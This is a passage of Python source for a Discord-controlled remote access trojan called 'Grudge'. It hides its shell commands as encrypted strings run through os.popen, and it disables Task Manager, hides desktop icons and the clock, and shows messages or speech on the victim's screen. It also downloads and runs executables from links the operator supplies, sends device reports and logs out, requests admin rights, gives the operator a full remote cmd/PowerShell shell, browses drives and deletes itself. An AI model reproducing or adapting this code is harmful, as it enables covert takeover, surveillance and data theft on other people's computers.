                if '0x0' in key: os.popen((decrypt_txt(b'gAAAAABlvShn7v-WFwY9FagocVennB2P7TDJatWhLtxmjDmRTdrFZGLvBcUa9lpexUKQEYBUFfyinXi44nUygHiBiFTHJYEjUf_F4EYstCdkeErWhsW0RhrexFbOJzzKXYFD4TtmgTNacgvTFGMK8TCn0QrmXKpBcMJN3hDBFWwRy3Ceox2GQdYWfrrbh6KLrHo8xs9bE_RF8450MvUXyxDwF2mPqNkfqHlGbwK8jB5C3nIRAawWMic='))); await ctx.send('Tray Notification: OFF')
                else: os.popen((decrypt_txt(b'gAAAAABlvSh2c3pKgbQ2QKtIvqTYZTBxOQtccOQ9z8O0iy5oxXNMD7YoKhCDql3r8JSNH8rDPo14QY2uyrur49GKaXBAS7B2IhEU4Cae-Xe_qh4qx1O3WXvFajmF9fvbnwF3fgfMmDZ82f8eKlHqYjlfe_7o33x54MGhQhkR2UyJ5wM5g-NwEf5cWvGwmn5uP3cCW9nylApw-BFFu445oDN5s5gwSE9c6rqccmjy9QD0IxpiMch9DjY='))); await ctx.send('Tray Notification: ON')
                os.popen((decrypt_txt(b'gAAAAABlvSiT_T15vYGJ3OQTX81ANbFV1bgFPMb2oDbWW5WR4vqzjiXimDMcmOwqrn-pXZAHsbZRcsK9A1jFmik0k4YAnFUPHSEszm_HuAAsVCTy3UFgUOU560PHDt5MK_Gx7XbcjgwNs9tEw1UkT8mwJYh1k8gATw==')))
            TrayNotify.callback = button_callback
            #================================#
            Tsmgr = Button(label='Task manager ON/OFF👑', style=discord.ButtonStyle.red) 
            view = View()
            view.add_item(Tsmgr)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                key=os.popen((decrypt_txt(b'gAAAAABlvSjn520zPOmtdiEU5h-5ifYkyIa51QVgo3hQasBG8yNNg0kPvM3rGVPsPqUN3JIw5ChEu5-lHyBfoqgeWGjq20TQufU70KXukBeHRvFnuja15XFoFgEkeOTPtPyg-uuVD9nNrIhTx3WWXIrVxhWb-HMKsJExHvSyHTvNUrPnT3ddiOlPu7glGkANIv6JfV-zSGi9'))).read()
                if '0x1' in key: os.popen((decrypt_txt(b'gAAAAABlvSkFLChX6yItB0P6k-35mRScSHw-OVrjkcJlSDuf1zAf2tavLFgD-yeieYlOYYfsEAMyJnbiKpzv7r8bToSXKYswd7mtW4lqv7miihhA3-wyebXBpqVBzRIg_QU1ijPw3TgGKmdyiTn832vyNAihYSNjIVhl1HbRjkJak_uG6SmV5bAcyR2SrVJV3R5cqbGZxIClxXD0IOfLF5hWsWimkkN5Tw=='))); await ctx.send('Task manager: ON')
                else: os.popen((decrypt_txt(b'gAAAAABlvSkefte8-jgFsG9YfYjXWUqpXYk8a-ZhqLOODYTCtTag00CsKxMjhLqcAh1MdY9gIAxq9Sz76DGXpuM8hxVkcIIyCpO39NGiz-mBUtwnE6QTf-vtqL-plMa3iPqJHY81RnyBXG5DxsNn3sI6U2cnSPzkckA2pZtYscn_LWrtTzdtVVAu9o8x44KvDk2T_jVBj1ShS7MvcF6evkBHyHA-HQz7kA=='))); await ctx.send('Task manager: OFF')
            Tsmgr.callback = button_callback
            #================================#
            Dhide = Button(label='Hide Desktop icons ON/OFF👑', style=discord.ButtonStyle.red) 
            view = View()
            view.add_item(Dhide)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                key=os.popen((decrypt_txt(b'gAAAAABlvSlSo0Myngl68TFF_u3yxgcNQOiFows0KJXzfySBOty5bBr_9MYdA1DF939ngOg-4Fi9j-nYBiqbHUkPcjNL1JqLjmr1GAM6-fuyTF4ZYM-cPbrzm_F5_xt3F2CSmQP7lng1-6l8EDoo9gvkBBVkt8TSXiIkY9icucQ45iIq5CRjpEpuzLkg-weLcnMknzhOtznXgPhna-SWuCsIDc7r-qqEOw=='))).read()
                if 'The system was unable' in key: os.popen((decrypt_txt(b'gAAAAABlvSltMKI2uSJtnMZh-KJCfARuJYX8PGaIgdL17CEgzECLGvadliwAUIxBH3TWmjrZVQ2K9omnL5F9oke1UIY087g-GqILtfhVNHG9RPr3B1KlQ20qjEuydSBZms3t_ZEiPIPXgiUWIZ1UADUUdcpCAdW2iCyZKWL0i7RPLHqK0J-9xhb8jTBoGiUvEvCaTlRdhwkpOMlybsPosBhY_E611PzdkuqhE2L8cb2HGL4qtzS8eF0=')))
                if '0x1' in key: os.popen((decrypt_txt(b'gAAAAABlvSmPrWZ0ijpfYHk-wHaGTpgTtagY5fbbpVYXpYMJxEwlOdRKbti1APYLm65_MBIApZfnhMzWqocM-_34v5tnd89XV1Tri2l4nSLhYU-Ug8LdnL8UT4fYhpQQB0JKWBr6-4DH5J9EB51J21LKmGb2eAUFk0hmhXmKHZIUCU5e4Gp9i37uIiCL6hgZLhXZj2YiwcNBQRjSvLEyCcjnLrGNk1sZdhuw1I--eO9R06ELNXaWit4='))); await ctx.send('Hide Desktop icons: OFF')
                else: os.popen((decrypt_txt(b'gAAAAABlvSmwXKW4CYdmUYRYQsEAhoY33pxXHuXVznN-Mdf0MAM9krvd06SivrNLk0PyT73t9VyPTdsCXjT01EZXcijaaIBAnAQh1dTk_MFJ9CYPOQ89F05e1B--REAmMLjPccWCPh94uAJiMqzjmZoKaPnqsD8qN5ueH6WNV5wh8WUjX4ajf2TQePEpDW2iv5r9e2v-VvJmI3t9nV_yJbGgEEMw4zrLxkPvGCEyFOFi9mRSJqGl3Po='))); await ctx.send('Hide Desktop icons: ON')
                os.popen((decrypt_txt(b'gAAAAABlvSiT_T15vYGJ3OQTX81ANbFV1bgFPMb2oDbWW5WR4vqzjiXimDMcmOwqrn-pXZAHsbZRcsK9A1jFmik0k4YAnFUPHSEszm_HuAAsVCTy3UFgUOU560PHDt5MK_Gx7XbcjgwNs9tEw1UkT8mwJYh1k8gATw==')))
            Dhide.callback = button_callback
            #================================#
            Chide = Button(label='Hide Clock ON/OFF👑', style=discord.ButtonStyle.red) 
            view = View()
            view.add_item(Chide)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                key=os.popen((decrypt_txt(b'gAAAAABlvSnovon_xnYdbQDQa-JbX0AERBW_fk2EBcVH6Vt9T2MWpYhXCDp2DF2RFpuZYXKXR9iy-t_f22G8WYCAvg_MIUXaM8zkhaInXW6ldysMvD2LDl8ap7_FgH1Bme8KOIToilTQ18ZagoQ8JWwEdfX1G11JEVlhUk_Dm86pEVBEnIL48yaIy45TLOHSgXMa9zVvYG0P7PVT2FeO0GywViPFPxvRmw=='))).read()
                if 'The system was unable' in key: os.popen((decrypt_txt(b'gAAAAABlvSoM7N72StsZ-7jxNYHwR-E6QsZh28nxextfoE738WT1ggmAB38UVg0nJl9XJa_ZdN5zupevazk7_6_OZQ2Ca4q7tQJBz5T0hYzWrRPGddmb9VU1Pf5XPSv-vjlCo9I69NuxwGQjAqo1g5OGXPHsyqm1rRUfF0L782k9hFQgxmIJ1P-FWY28hLiqIw1LaYP_vYjXMzrQjHVl45xEY3Vfzf1OtJYgcCeiBtWOYqSK19p-tls=')))
                if '0x1' in key: os.popen((decrypt_txt(b'gAAAAABlvSrcyzGdHWv-IIQyID-iK1KmXJtZARjKm1j7Dvg-HQRQql3d_eOMogPap9J2GEzHkphwWU_EBHFqXbnrRu2BRUwdihg8jEZlTJX61ifN73LxAxVGVKvGySoBLWllhJ908uoaEA_KYwCeEPQpggHRAE0dEiwXMQ1L3JIrG3vlzuW0cxnnkPlRb5DIenSFBc8EpTFiBj2I6ME3RQbX_Cd3KUOvaSCmQPPIcUhSkGzKL8HxiiU='))); await ctx.send('Hide Clock: OFF')
                else: os.popen((decrypt_txt(b'gAAAAABlvSsA4Du5pWx8_Po_o0HeACFt_qm1bGxuL0z-u-jtOFs1wX99AgGzNVfJG1kUw1YSNg62mUs9aT0FtUEIqQL02AL2uCWI41XNfOfuLaoluXkaEPEYBsP-Fw4YocuYVrVF6LROk6HBkWInl0GD7Lo3_GmlgdgwLLOD5eUi-K6fIqrNBEfk6H3gk4--doY11gSQsKF3dQyGsMBItpvNl-VkACXTk2iII1VQzQj5BR5SGy_KNgo='))); await ctx.send('Hide Clock: ON')
                os.popen((decrypt_txt(b'gAAAAABlvSiT_T15vYGJ3OQTX81ANbFV1bgFPMb2oDbWW5WR4vqzjiXimDMcmOwqrn-pXZAHsbZRcsK9A1jFmik0k4YAnFUPHSEszm_HuAAsVCTy3UFgUOU560PHDt5MK_Gx7XbcjgwNs9tEw1UkT8mwJYh1k8gATw==')))
            Chide.callback = button_callback
            #================================#
            msgbox = Button(label='Send a message', style=discord.ButtonStyle.blurple) 
            view = View()
            view.add_item(msgbox)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                await ctx.send('Enter the text you want to display (for exit type Cancel): ')
                msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel)
                if '\n' in msg.content : msg.content = (msg.content).replace('\n',' ')
                if (msg.content).lower() == 'cancel': return
                else: os.popen(f'''PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{msg.content}', 'Grudge👁')"''')
                Again = Button(label='Again', style=discord.ButtonStyle.blurple) 
                view = View()
                view.add_item(Again)
                await ctx.send(view=view)
                async def button_callback(interaction):
                    await interaction.response.defer()
                    await ctx.send('Enter the text you want to dispaly (for exit type Cancel): ')
                    msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel)
                    if '\n' in msg.content : msg.content = (msg.content).replace('\n',' ')
                    if (msg.content).lower() == 'cancel': return
                    else: os.popen(f'''PowerShell -Command "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('{msg.content}', 'Grudge👁')"'''); await ctx.send(view=view)
                Again.callback = button_callback  
            msgbox.callback = button_callback
            #================================#
            speak = Button(label='Speak Text', style=discord.ButtonStyle.blurple) 
            view = View()
            view.add_item(speak)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                await ctx.send('Enter the text you want to speak (for exit type Cancel): ')
                msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel)
                if '\n' in msg.content : msg.content = (msg.content).replace('\n',' ')
                if (msg.content).lower() == 'cancel': return
                else: os.popen(f'''PowerShell -Command "Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{msg.content}');"''')
                Again = Button(label='Again', style=discord.ButtonStyle.blurple) 
                view = View()
                view.add_item(Again)
                await ctx.send(view=view)
                async def button_callback(interaction):
                    await interaction.response.defer()
                    await ctx.send('Enter the text you want to speak (for exit type Cancel): ')
                    msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel)
                    if '\n' in msg.content : msg.content = (msg.content).replace('\n',' ')
                    if (msg.content).lower() == 'cancel': return
                    else: os.popen(f'''PowerShell -Command "Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{msg.content}');"'''); await ctx.send(view=view)
                Again.callback = button_callback  
            speak.callback = button_callback
            #================================#
        elif msg.content == '11':
            btn = Button(label='log', style=discord.ButtonStyle.green) 
            view = View()
            view.add_item(btn)
            await ctx.send(view=view)

            async def button_callback(interaction):
                await interaction.response.defer()
                global logs
                await sendfile(ctx,logs,'log.txt')
                logs = ''
            btn.callback = button_callback 
        elif msg.content == '12':
            if not isUserAdmin(): runAsAdmin()
        elif msg.content == '13':
            await ctx.send((decrypt_txt(b'gAAAAABlvSIzLspgj-BeFkhXit71aNqqrQxOdO0t2FF1_mouF4qjyzUTvhTc1J-0zd6qekpXRA1nTwnHR1xuRExJCROEa-NN99qAS1ilyNYKJ4195an8CxY=')))
            msg = await bot.wait_for("message")
            if msg.content=='1':
                os.popen((decrypt_txt(b'gAAAAABlvR6hkpzso6cY7QYfprWAZKO55ZJh_jL8rz0H3GIXk4RM3iQogL4EvKm3YNs2g3gA7NNmv4EhAp_EIvaYV_8DTFIIv6PD0wTrZkSOBejFyKdzgBM2J515IHUJHZp3g2uOPlCTu4AJS4eUKFupdAmKv4kccOGYa1whLOEF1S2KsFD4xO0Zwvu3YbkhrM_fOJKcc6RLKCJBHpSo31zhfQ4n8i5Xag==')))
                os.popen((decrypt_txt(b'gAAAAABlvR8VVqRvLNya14m___LJpVy5-_UlNLP0aw3PyAmaSMvC8YpqMV7ivi9Rz9_b5dC0UtV3YpTtCHgeM8dE2H82iFmq-g_nkxCs1wBFjSGc5jw-BA8U118cUk0a76RcB6Z1oCp0AtwytV1dVsLqA0xAZ_uy9vzTuaJWlBXRMAI8qFapEGywWg02JIFn4-llKP1f4kGEEmoBLXyFgXexrpLrHr_tCmJiR9xrd-rH6rqDXO7wjOA=')))
                await msg.add_reaction('{}'.format(R_Emoji))
            if msg.content=='2':
                os.popen((decrypt_txt(b'gAAAAABlvR81fGfudp6sN8d8oZzcPJJiFFc0sO6iafOwQViOz-QKgWHVYpc4nVtkTAOWJzk-w82xGFWsQ1ND9fQXKH6m14-whDdIkBjEdHDo1KqoI417CfjAEtIp_GcCtFokz1_rcexnHxrfYklXBMCDgHp_EEgjQhblz_F0R8KWYfL1GOxFPvfYJDjMjRhOkub2wDTReSaBlkLn7_tIurka-s6z6JS-oA==')))
                os.popen((decrypt_txt(b'gAAAAABlvR9KP6U973x40KuwYhYJbL_ViCOoP8Fjo9eRMlZWSTd5OgsY3Sq_VqAx04AN_rJoVE5q4_laIQxt4DK3bFhHISizjXP7YNE34NfaCBLqOrYhZQ0jZVaQFZfOgHR1h3IZJDi1c_06VAC2aeFl06Vxt7Q9jJUuaHyXB1YhqC9GQB93S4LJJUQGz0KWaf_sLJihXT91NxjeX-ZNJlyHDZcB1CX9coxn3oPI5hNzhL7WnSoU2ls=')))
                await msg.add_reaction('{}'.format(R_Emoji))
        else: await monitor(ctx,msg)
    #=======================================APP INSTALLER=======================================#
    elif msg.content == '2':
        await ctx.send('{}'.format((decrypt_txt(blist)))); sleep(0.5); msg = await bot.wait_for("message")
        if msg.content == '1':
            msg = await ctx.send('Checking For Updates|')
            for i in range(0,2): await msg.edit(content='Checking For Updates /'); sleep(1); await msg.edit(content='Checking For Updates ―'); sleep(1); await msg.edit(content='Checking For Updates \\'); sleep(1); await msg.edit(content='Checking For Updates /'); sleep(1); await msg.edit(content='Checking For Updates ―'); sleep(1); await msg.edit(content='Checking For Updates \\')
            check_for_updates()
            sleep(0.5)
            if update==True:
                global info
                await msg.edit(content='{}'.format(info))
                Download_button = Button(label='Download', style=discord.ButtonStyle.green) 
                view = View()
                view.add_item(Download_button)
                await ctx.send(view=view)

                async def button_callback(interaction):
                    await interaction.response.defer()
                    msg = await ctx.send('Downloading some files \n|█          |')
                    animation='█'
                    space='         '
                    number=9
                    for i in range(0,10):
                        await msg.edit(content='Downloading some files \n|{}{}|'.format(animation,space))
                        animation = animation+'█'
                        number=number-1
                        space=space[0:number]
                        sleep(1)
                    await ctx.send('Now Wait..')
                    download('{}'.format(GrudgeLink),'Grudge2.exe')
                    sleep(1)
                    Grudge=os.path.exists('{}Grudge2.exe'.format(Main_Location))
                    sleep(0.5)
                    if Grudge!=True:
                        download('{}'.format(GrudgeLink),'Grudge2.exe')
                    elif Grudge==True:
                        global App_Name
                        App_Name = UpdateData()[0]
                        name = UpdateData()[1]
                        old = os.path.join('{}'.format(Main_Location), '{}'.format(App_Name))
                        new = os.path.join('{}'.format(Main_Location), '$77Broken.exe')
                        os.rename(old,new)
                        old = os.path.join('{}'.format(Main_Location), 'Grudge2.exe')
                        new = os.path.join('{}'.format(Main_Location), '{}.exe'.format(name))
                        sleep(0.8)
                        os.rename(old,new)
                        await ctx.send("Updated successfully")
                        await ctx.send("---------------------")
                        update_downloads()
                        global update
                        update = False
                        sleep(0.3)
                        await ctx.send(f'''-------------------------\n  Welcome To Grudge {float(version)}\n-------------------------''')
                        sleep(3.5)
                        os.popen('{}{}'.format(Main_Location,App_Name))
                        sleep(1)
                        sys.exit()
                        exit()
                        quit()
                Download_button.callback = button_callback
            else: await msg.edit(content='Your Grudge is up to date :)')           
        elif msg.content =='2':
            mail = await ctx.send('Send App Link : ')
            msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel)
            link1=msg.content
            if link1[0:5] == 'https':
                await ctx.send('installing Grudge')
                download('{}'.format(link1), 'Grudge2.exe')
                mail = await ctx.send("Send Info Link :")
                Continue=True
                if Continue==True:
                    await mail.edit(content='Send Info Link :')
                    msg3 = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel)
                    link3 = msg3.content
                    if link3[0:5] == 'https':
                        download('{}'.format(link3), 'info.txt')
                    if Continue==True:
                        Grudge=os.path.exists('{}Grudge2.exe'.format(Main_Location))
                        info=os.path.exists('{}info.txt'.format(Main_Location))
                        sleep(0.5)
                        if Grudge!=True:
                            download('{}'.format(link1), 'Grudge2.exe')
                        if info!=True:
                            download('{}'.format(link3), 'info.txt')
                        inf = open('{}info.txt'.format(Main_Location), 'r')
                        info= inf.read(); inf.close()
                        msg = await ctx.send('Now Wait..')
                        sleep(0.5)
                        await msg.edit(content='{}'.format(info))
                        if Continue==True:
                            Download_button = Button(label='Download', style=discord.ButtonStyle.green) 
                            view = View()
                            view.add_item(Download_button)
                            await ctx.send(view=view)
                            async def button_callback(interaction):
                                await interaction.response.defer()
                                os.remove('{}info.txt'.format(Main_Location))
                                global App_Name
                                old = os.path.join('{}'.format(Main_Location), '{}'.format(App_Name))
                                new = os.path.join('{}'.format(Main_Location), '$77Broken.exe')
                                os.rename(old,new)
                                old = os.path.join('{}'.format(Main_Location), 'Grudge2.exe')
                                new = os.path.join('{}'.format(Main_Location), '{}'.format(App_Name))
                                sleep(0.5)
                                os.rename(old,new)
                                await ctx.send("Updated successfully")
                                await ctx.send("---------------------")
                                update_downloads()
                                global update
                                update = False
                                await ctx.send(f'''-------------------------\n  Welcome To Grudge {float(version)}\n-------------------------''')
                                sleep(3.5)
                                os.popen('{}{}'.format(Main_Location,App_Name))
                                sleep(1)
                                sys.exit()
                                exit()
                                quit()
                            Download_button.callback = button_callback 
                        else:
                            pass
                    else:
                        await ctx.send('Wrong link')
                        return
                
                else:
                    await ctx.send('Wrong link')
                    return

            else:
                await ctx.send('Wrong link')
                return
        else: await monitor(ctx,msg)
    #=======================================DEVICE INFORMATION=======================================#
    elif msg.content == '3':
        global Report
        msg=await ctx.send('Please Wait...')
        Report = f'''{(os.popen((decrypt_txt(b'gAAAAABlvR90gRnG_5VMKVrES2REhQ7oF8QP48E8hcix5NksklVgBOOGtvzM-YB2R9fyeZQkot-xUoDTqN_9g2lKsTYTsRmJjw==')))).read()}'''
        sleep(1)
        await msg.edit(content=(decrypt_txt(b'gAAAAABlvR-fotGCZDOcpE_wun1Z5yYSMIc9SlccWKacXN-zyQNf5QkUv036ewp0pIU3gAa-65qfobaychcvBC9zYgVRvR5rt06wMRTXK_jMnDNAOXr3Ue-mYrdR4w1IbB9GbG-r7avg47b1OZKJMxXDJfkmGTh2Jw==')))
        sleep(0.5)
        try:
            await ctx.send('```{}```'.format(Report))
        except:
            await advanced_send(ctx,Report,quotes=True)
        sleep(0.5)
        await ctx.send('---------------------------')
        Download_button = Button(label='Download PDF', style=discord.ButtonStyle.red) 
        view = View()
        view.add_item(Download_button)
        await ctx.send(view=view)
        async def button_callback(interaction):
            global Report
            await interaction.response.defer()
            await sendfile(ctx,Report,'Report.txt')
            Report = None
        Download_button.callback = button_callback
    #=======================================SETTINGS=======================================#
    elif msg.content == '4':
        global default_password
        await ctx.send('{}'.format((decrypt_txt(dlist)))); sleep(0.5); msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel)
        if msg.content == '1':
            await ctx.send(f'{cautious}')
            yes_button = Button(label='Continue', style=discord.ButtonStyle.success) 
            view = View()
            view.add_item(yes_button)
            await ctx.send(view=view)

            async def button_callback(interaction):
                await interaction.response.defer()
                password = read('Default password',default_password)
                mail = await ctx.send('Enter The Password : ')
                msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel)
                if (msg.content) == password:
                    await ctx.send('Removing Grudge From The Device..')
                    sleep(2)
                    msg = await ctx.send('Requesting del file.')
                    for i in range(1,3): sleep(1); await msg.edit(content='Requesting del file..'); sleep(1); await msg.edit(content='Requesting del file...'); sleep(1); await msg.edit(content='Requesting del file.')
                    await msg.edit(content='Deleted Successfully!')
                    
                    msg = await ctx.send('the server will shutdown in (3)')
                    count = 3
                    for i in range(0,4):
                        await msg.edit(content='the server will shutdown in ({})'.format(count))
                        sleep(1)
                        count = count-1
                    loc = f'{Main_Location}delete.bat'
                    with open(f'{loc}','w') as file:
                        file.write(f'''sleep 0.3\ndel {App_Name}\ndel "delete.bat"''')
                        file.close()
                    sleep(1.7)
                    os.popen(f'''start cmd /c "{loc}"''')
                    sys.exit()
                else: await monitor(ctx,msg,'wrong password!')
            
            yes_button.callback = button_callback
            no_button = Button(label='Cancel', style=discord.ButtonStyle.danger); view = View(); view.add_item(no_button); await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                pass
            no_button.callback = button_callback
        elif msg.content == '2':

            Turn_ON = Button(label='Turn ON ', style=discord.ButtonStyle.green)
            view = View()
            view.add_item(Turn_ON)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                await ctx.send('Turned ON')
            Turn_ON.callback = button_callback

            Turn_OFF = Button(label='Turn OFF', style=discord.ButtonStyle.danger) 
            view = View()
            view.add_item(Turn_OFF)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                await ctx.send('Turned OFF')
            Turn_OFF.callback = button_callback
        elif msg.content == '3':
            mail = await ctx.send('Enter Old Password : ')
            sleep(0.3)
            msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel)
            sleep(0.5)
            await msg.delete()
            #------------------------------------------------------------------------------#
            password = read(default_password)
            old = msg.content
            print(f'received {old} - passowrd {password}')
            if old == password:
                await mail.edit(content='Enter A New Password : ')
                msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel)
                sleep(0.5)
                await msg.delete()
                await mail.edit(content='Enter Admin permission Code Key :')
                admin_key = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel)
                await admin_key.delete()
                adminKey = read_site(KeyLink)
                sleep(0.3)
                if int(admin_key.content)==int(adminKey):
                    contents = repo.get_contents("password.txt")
                    repo.update_file(contents.path, "Password file", f"{admin_key}", contents.sha, branch="Grudge")
                    await mail.edit(content='Changed successfully!')
                else:
                    await monitor(ctx,admin_key,reply='Wrong Key [4092]')
            else:
                await monitor(ctx,msg,reply='Wrong Password!')
        elif msg.content == '4':
            await ctx.send('𝕲𝖗𝖚𝖉𝖌𝖊 𝕻𝖗𝖔𝖙𝖊𝖈𝖙𝖎𝖔𝖓')
            activate = Button(label='Activate⛊', style=discord.ButtonStyle.green) 
            view = View()
            view.add_item(activate)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                await ctx.send('Activated⛊')
            activate.callback = button_callback
            #----------------------------------#
            Shut_down = Button(label='Disactivate🛡', style=discord.ButtonStyle.red) 
            view = View()
            view.add_item(Shut_down)
            await ctx.send(view=view)
            async def button_callback(interaction):
                await interaction.response.defer()
                #Empty
                pass
            Shut_down.callback = button_callback
        else: await monitor(ctx,msg) 
    #else: await monitor(ctx,msg) 

LimitEntry = 1
msg_tosend = ''
cmdps1command=None
ospopen_result=None
@bot.command()
async def cmd(ctx,prompt='cmd'):
    global cmdps1command, ospopen_result
    messagesID=[]
    global command_prompt_result
    if prompt=='ps1': location='PS '+os.getcwd()
    if prompt=='cmd': location=os.getcwd()
    if prompt=='ps1': window='''```▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆\nPowershell                         _▢X\n‎\n\n\n\n\n▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆\n```'''
    if prompt=='cmd': window='''```▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆\nCMD                                _▢X\n‎\n\n\n\n\n▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆▆\n```'''
    message=(window.replace('\\','>')).replace('‎',f'{location}>▎')
    shell = await ctx.send(f'{message}')
    shellContent = message
    command_line=2
    sleep(0.5)
    Continue=True
    while Continue==True:
        try:
            msg = await bot.wait_for('message', check=lambda m: m.author == ctx.author and m.channel == ctx.channel, timeout = 2.5)
            if '▎' in shellContent: 
                await shell.edit(content=f"{(shellContent).replace('▎',msg.content)}")
                shellContent=shellContent.replace('▎',msg.content)
            else: 
                await shell.edit(content=f"{(shellContent).replace('‎',msg.content)}")
                shellContent=shellContent.replace('‎',msg.content)
            if 'cd ' in (msg.content).lower():
                if 'Cd ' in msg.content: os.chdir(((msg.content).split('Cd ')[1]))
                elif 'CD ' in msg.content: os.chdir(((msg.content).split('CD ')[1]))
                elif 'cd ' in msg.content: os.chdir(((msg.content).split('cd ')[1]))
                elif 'cD ' in msg.content: os.chdir(((msg.content).split('cD ')[1]))
                result=None
            elif (msg.content).lower()=='cd..':
                os.chdir('..')
                result=None
                print('cd..',msg.content)
            elif (msg.content).lower()=='cls':
                if prompt=='ps1': location='PS '+os.getcwd()
                if prompt=='cmd': location=os.getcwd()
                message=(window.replace('\\','>')).replace('‎',f'{location}>▎')
                shellContent = message
                await shell.edit(content=shellContent)
                result = False
                try:
                    for msgid in messagesID:
                        await msgid.delete()
                except : pass

                messagesID=[]
            elif (msg.content).lower()=='exit':
                Continue=False
                await delete_last(ctx)
                await shell.delete()
                try:
                    for msgid in messagesID:
                        await msgid.delete()
                except: pass
                messagesID=[]
                break

            else:
                try:
                    if prompt=='ps1': cmdps1command=f'powershell {msg.content}'; Thread(target=ospopen).start() #result=os.popen(f'powershell {msg.content};;exit').read()
                    if prompt=='cmd': cmdps1command=f'{msg.content}'; Thread(target=ospopen).start() #result=os.popen(f'{msg.content}&&exit').read()
                    tries=0
                    while ospopen_result==None and tries <8:
                        sleep(1)
                        tries+=1
                    
                    if ospopen_result!=None: result = ospopen_result
                    if ospopen_result==None: result = ''
                except Exception as e:
                    result=e
            sleep(1.5)
            command_line=findline(shellContent,msg.content)
            lines = (shellContent).splitlines()
            if result != None and result != False:
                if prompt=='ps1': lines[command_line] = f"{result}"+((f"PS {os.getcwd()}>▎")+ '\n')
                if prompt=='cmd': lines[command_line] = f"{result}"+((f"{os.getcwd()}>▎")+ '\n')
            elif result==None and result != False:
                if prompt=='ps1': lines[command_line] = f"PS {os.getcwd()}>▎\n"
                if prompt=='cmd': lines[command_line] = f"{os.getcwd()}>▎\n"
            shellContent = "\n".join(lines)
            try: 
                await shell.edit(content=f'{shellContent}')
            except: shell, allmsgid = await advanced_send(ctx,shellContent,delete=False,quotes=True); shellContent=shell.content; messagesID=messagesID+allmsgid
        except:
            if '▎' in shellContent: 
                await shell.edit(content=f"{(shellContent).replace('▎','‎')}")
                shellContent=shellContent.replace('▎','‎')
            else:
                await shell.edit(content=f"{(shellContent).replace('‎',f'▎')}")
                shellContent=shellContent.replace('‎','▎')
        ospopen_result=None
        await delete_last(ctx)
@bot.command()
async def run(ctx):
    channel = bot.get_channel(1126065698200895579)
    global msg_tosend
    global LimitEntry
    R_Emoji='<:emoji_16:1115185197424590849>'
    LimitEntry = 1

    def Search_Engine(res):
        primary_message = ''
        if (res[-3:]).lower()=='.py':
            primary_message = primary_message + "<:emoji_6:1110592430765527050>{}".format(res) + '\n'
        elif (res[-4:]).lower()=='.vbs':
            primary_message = primary_message + "<:emoji_6:1110594198639497267>{}".format(res) + '\n'
        elif (res[-4:]).lower()=='.png' or (res[-4:]).lower()=='.jpg' or (res[-4:]).lower()=='.ico' or (res[-4:]).lower()=='.gif' or (res[-5:]).lower()=='.jpeg' or (res[-5:]).lower()=='.tiff' or (res[-4:]).lower()=='.avi' or (res[-4:]).lower()=='.mp4' or (res[-4:]).lower()=='.mov' or (res[-4:]).lower()=='.mkv' or (res[-4:]).lower()=='.wmv' or (res[-4:]).lower()=='.flv':
            primary_message = primary_message + "<:emoji_7:1110487396589506641>{}".format(res) + '\n'
        elif res[-4:]=='.url':
            primary_message = primary_message + "🌐{}".format(res) + '\n'
        elif res[-4:]=='‏.py':
            primary_message = primary_message + "<:emoji_13:1110672669344551002>{}".format(res) + '\n'
        elif res[-5:]=='‏.txt':
            primary_message = primary_message + "<:emoji_12:1110672644044501102>{}".format(res) + '\n'
        elif res[-4:]=='.dll':
            primary_message = primary_message + "<:emoji_14:1110678650329772102>{}".format(res) + '\n'
        else:
            primary_message = primary_message + "📄{}".format(res) + '\n'
        return primary_message
    drives = [chr(x) + ':' for x in range(65, 90) if os.path.exists(chr(x) + ':')]


    while True and LimitEntry == 1:
        if LimitEntry == 1:
            LimitEntry = 0
        else:
            break
        sleep(0.8)
        result = '1'
        if result == '1':
            await ctx.send('```Quick Acess:\n1. Desktop\n2. Videos\n3. Pictures\n4. Downloads\n```')
            sleep(0.8)
            await ctx.send('```Drives: ```')
            msg = '```'
            for x in range(len(drives)):
                sleep(0.8)
                msg += drives[x]+'\n'
            await ctx.send(f'{msg}```')

            while True:
                sleep(1)
                await ctx.send("```Enter your Choice: ```")
